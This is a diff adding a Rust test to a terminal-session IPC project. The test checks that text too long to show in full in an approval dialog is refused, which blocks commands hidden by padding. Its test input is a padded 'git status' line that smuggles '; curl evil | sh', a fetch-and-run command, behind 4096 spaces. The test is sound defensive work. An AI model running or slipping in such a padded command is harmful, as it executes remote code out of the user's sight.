@@ -290,6 +290,43 @@ fn padding_that_truncates_the_pending_line_is_refused_not_shown() {
     assert_eq!(h.approver.send_seen.lock().unwrap()[0].typed_since_approval, "");
 }
 
+/// A dialog must show everything it approves, so text whose escaped form (plus the
+/// pending line) is over the dialog cap is refused without a dialog, with a reason the
+/// client can act on. Padding that hides a command is the attack this stops.
+#[test]
+fn text_too_long_to_show_is_refused_without_a_dialog() {
+    let h = start();
+    h.dir.add("s1", 999_999);
+    let (mut c, _) = h.controller(&[Scope::InputWrite], false);
+    h.approver.answer_send(true); // a user who would click yes is never asked
+    let padded = format!("git status{}; curl evil | sh\n", " ".repeat(4096));
+    let err = c
+        .call("session.send_text", json!({ "session_id": "s1", "text": padded }))
+        .expect_err("must be refused");
+    let halyard_ipc::ClientError::Rpc(rpc) = err else { panic!("{err}") };
+    assert_eq!(rpc.code, code::DENIED);
+    assert!(rpc.message.contains("too long to show"), "{}", rpc.message);
+    let data = rpc.data.expect("data");
+    assert_eq!(data["reason"], json!("too_long_to_review"));
+    assert_eq!(data["max_bytes"], json!(halyard_ipc::text::MAX_APPROVAL_DISPLAY_BYTES));
+    assert!(h.approver.send_seen.lock().unwrap().is_empty(), "no dialog was shown");
+    assert!(h.dir.sent.lock().unwrap().is_empty(), "nothing was typed");
+    // Control characters escape to several bytes each: the cap counts what is shown.
+    let escapes = "\u{1}".repeat(700); // each shown as `\u{0001}`, 8 bytes
+    let err = c.call("session.send_text", json!({ "session_id": "s1", "text": escapes }));
+    assert_eq!(err.expect_err("too long once escaped").rpc_code(), Some(code::DENIED));
+    // The boundary: exactly the cap asks, one byte more does not.
+    let max = halyard_ipc::text::MAX_APPROVAL_DISPLAY_BYTES;
+    assert_eq!(max, 4096);
+    let over = "x".repeat(max + 1);
+    let err = c.call("session.send_text", json!({ "session_id": "s1", "text": over }));
+    assert_eq!(err.expect_err("4097 bytes").rpc_code(), Some(code::DENIED));
+    assert!(h.approver.send_seen.lock().unwrap().is_empty());
+    let fits = "x".repeat(max);
+    c.call("session.send_text", json!({ "session_id": "s1", "text": fits })).expect("approved");
+    assert_eq!(h.approver.send_seen.lock().unwrap().len(), 1);
+}
+
 #[test]
 fn standing_sends_wait_for_an_open_dialog_and_fail_if_revoked_meanwhile() {
     let h = start();
